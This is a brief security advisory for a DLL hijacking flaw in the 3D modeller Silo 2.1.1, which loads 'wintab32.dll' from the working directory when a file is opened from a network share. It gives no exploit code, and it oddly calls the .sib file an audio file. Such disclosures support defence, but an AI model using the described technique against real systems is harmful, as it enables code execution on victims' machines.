 Nevercenter Silo 2.1.1 Insecure Library Loading Vulnerability


 Vendor: Nevercenter Ltd. Co.
 Product web page: http://www.nevercenter.com
 Affected version: 2.1.1

 Summary: Silo 2 is a focused 3D modeling application with the
 ability to effortlessly switch between organically sculpting
 high-polygon models and precisely controlling hard-edged surfaces.
 It can be used for anything from creating 3D characters for video
 games and movies to quickly exploring 3D architectural ideas. Silo
 is currently being used at top studios worldwide as both a stand-alone
 design tool and as a versatile element of a multi-software 3D graphics
 workflow. It is available for both Windows and Mac OS.

 Desc: Silo 2 suffers from a DLL hijacking vulnerability, which could be
 exploited by remote attackers to compromise a vulnerable system.
 This issue is caused due to the application insecurely loading certain
 librairies ("wintab32.dll") from the current working directory, which
 could allow attackers to execute arbitrary code by tricking a user into
 opening an audio file (.sib) from a network share.

 Tested on: Microsoft Windows XP Professional SP3 (EN)
